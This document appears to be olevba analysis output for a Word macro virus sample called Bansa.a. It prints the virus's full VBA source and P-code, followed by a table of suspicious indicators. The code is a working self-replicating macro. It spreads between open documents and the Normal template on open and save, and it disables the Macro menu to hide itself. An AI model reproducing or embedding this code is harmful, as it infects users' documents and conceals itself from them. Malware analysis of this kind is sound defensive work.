olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Bansa.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Bansa.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Bangsat.bas 
in file: Virus.MSWord.Bansa.a - OLE stream: 'Macros/VBA/Bangsat'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Bangsat
' version 1.0a
' release 1
' dated October 01, 2001
' origin PMKN, Malaysia
' created by (iB@, Evbat, ali) all are same person, different identity
' from the MVS Studio
' message -> Thanks for being something in my life...
' and to whom did assemble this macro, There You'll Be, I Know!
' drop me a line at macam_jarum@yahoo.com

Sub AutoExec()
Application.StatusBar = "Bangsat betul si Liman tu yer...!!!"
BangsatSembunyi
End Sub

Sub AutoOpen()
Application.StatusBar = "Bangsat betul si Liman tu yer...!!!"
SangatBangsat
End Sub

Function SangatBangsat()
On Error Resume Next
Dim MulaBangsat As String
If MacroContainer = NormalTemplate Then
For i = 1 To ActiveDocument.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents.Item(i).CodeModule = "Bangsat" Then
GoTo DahKenaBangsat
Else
MulaBangsat = NormalTemplate.VBProject.VBComponents.Item("Bangsat").CodeModule.Lines(1, NormalTemplate.VBProject.VBComponents.Item("Bangsat").CodeModule.CountOfLines)
ActiveDocument.VBProject.VBComponents.Add vbext_ct_StdModule
ActiveDocument.VBProject.VBComponents.Item("Module1").CodeModule.AddFromString MulaBangsat
ActiveDocument.VBProject.VBComponents.Item("Module1").Name = "Bangsat"
BangsatMenggatal
ActiveDocument.Save
End If
Next i
Else
MulaBangsat = ActiveDocument.VBProject.VBComponents.Item("Bangsat").CodeModule.Lines(1, ActiveDocument.VBProject.VBComponents.Item("Bangsat").CodeModule.CountOfLines)
Application.OrganizerCopy ActiveDocument.FullName, NormalTemplate.FullName, "Bangsat", 3
NormalTemplate.Save
End If
DahKenaBangsat:
End Function

Sub FileOpen()
On Error Resume Next
Dialogs(wdDialogFileOpen).Show
SangatBangsat
Application.StatusBar = "Bangsat betul si Liman tu yer...!!!"
End Sub

Function BangsatSembunyi()
On Error Resume Next
CommandBars("Tools").Controls("Macro").Enabled = False
End Function

Function BangsatMenggatal()
With Dialogs(wdDialogFileSummaryInfo)
    .Comments = "Bangsat untuk kita menyukai orang, kemudian membencinya pula...macam_jarum@yahoo.com"
    .Execute
End With
End Function

Sub FileSaveAs()
On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
SangatBangsat
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Bansa.a
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 9414 bytes
' Macros/VBA/Bangsat - 9992 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0008 " Bangsat"
' Line #1:
' 	QuoteRem 0x0000 0x000D " version 1.0a"
' Line #2:
' 	QuoteRem 0x0000 0x000A " release 1"
' Line #3:
' 	QuoteRem 0x0000 0x0017 " dated October 01, 2001"
' Line #4:
' 	QuoteRem 0x0000 0x0016 " origin PMKN, Malaysia"
' Line #5:
' 	QuoteRem 0x0000 0x0045 " created by (iB@, Evbat, ali) all are same person, different identity"
' Line #6:
' 	QuoteRem 0x0000 0x0014 " from the MVS Studio"
' Line #7:
' 	QuoteRem 0x0000 0x0034 " message -> Thanks for being something in my life..."
' Line #8:
' 	QuoteRem 0x0000 0x003E " and to whom did assemble this macro, There You'll Be, I Know!"
' Line #9:
' 	QuoteRem 0x0000 0x0028 " drop me a line at macam_jarum@yahoo.com"
' Line #10:
' Line #11:
' 	FuncDefn (Sub AutoExec())
' Line #12:
' 	LitStr 0x0023 "Bangsat betul si Liman tu yer...!!!"
' 	Ld Application 
' 	MemSt StatusBar 
' Line #13:
' 	ArgsCall BangsatSembunyi 0x0000 
' Line #14:
' 	EndSub 
' Line #15:
' Line #16:
' 	FuncDefn (Sub AutoOpen())
' Line #17:
' 	LitStr 0x0023 "Bangsat betul si Liman tu yer...!!!"
' 	Ld Application 
' 	MemSt StatusBar 
' Line #18:
' 	ArgsCall SangatBangsat 0x0000 
' Line #19:
' 	EndSub 
' Line #20:
' Line #21:
' 	FuncDefn (Function SangatBangsat())
' Line #22:
' 	OnError (Resume Next) 
' Line #23:
' 	Dim 
' 	VarDefn MulaBangsat (As String)
' Line #24:
' 	Ld MacroContainer 
' 	Ld NormalTemplate 
' 	Eq 
' 	IfBlock 
' Line #25:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #26:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	LitStr 0x0007 "Bangsat"
' 	Eq 
' 	IfBlock 
' Line #27:
' 	GoTo DahKenaBangsat 
' Line #28:
' 	ElseBlock 
' Line #29:
' 	LitDI2 0x0001 
' 	LitStr 0x0007 "Bangsat"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitStr 0x0007 "Bangsat"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St MulaBangsat 
' Line #30:
' 	Ld vbext_ct_StdModule 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Add 0x0001 
' Line #31:
' 	Ld MulaBangsat 
' 	LitStr 0x0007 "Module1"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #32:
' 	LitStr 0x0007 "Bangsat"
' 	LitStr 0x0007 "Module1"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemSt New 
' Line #33:
' 	ArgsCall BangsatMenggatal 0x0000 
' Line #34:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #35:
' 	EndIfBlock 
' Line #36:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #37:
' 	ElseBlock 
' Line #38:
' 	LitDI2 0x0001 
' 	LitStr 0x0007 "Bangsat"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitStr 0x0007 "Bangsat"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St MulaBangsat 
' Line #39:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	LitStr 0x0007 "Bangsat"
' 	LitDI2 0x0003 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #40:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #41:
' 	EndIfBlock 
' Line #42:
' 	Label DahKenaBangsat 
' Line #43:
' 	EndFunc 
' Line #44:
' Line #45:
' 	FuncDefn (Sub FileOpen())
' Line #46:
' 	OnError (Resume Next) 
' Line #47:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #48:
' 	ArgsCall SangatBangsat 0x0000 
' Line #49:
' 	LitStr 0x0023 "Bangsat betul si Liman tu yer...!!!"
' 	Ld Application 
' 	MemSt StatusBar 
' Line #50:
' 	EndSub 
' Line #51:
' Line #52:
' 	FuncDefn (Function BangsatSembunyi())
' Line #53:
' 	OnError (Resume Next) 
' Line #54:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #55:
' 	EndFunc 
' Line #56:
' Line #57:
' 	FuncDefn (Function BangsatMenggatal())
' Line #58:
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #59:
' 	LitStr 0x0054 "Bangsat untuk kita menyukai orang, kemudian membencinya pula...macam_jarum@yahoo.com"
' 	MemStWith Comments 
' Line #60:
' 	ArgsMemCallWith Execute 0x0000 
' Line #61:
' 	EndWith 
' Line #62:
' 	EndFunc 
' Line #63:
' Line #64:
' 	FuncDefn (Sub FileSaveAs())
' Line #65:
' 	OnError (Resume Next) 
' Line #66:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #67:
' 	ArgsCall SangatBangsat 0x0000 
' Line #68:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

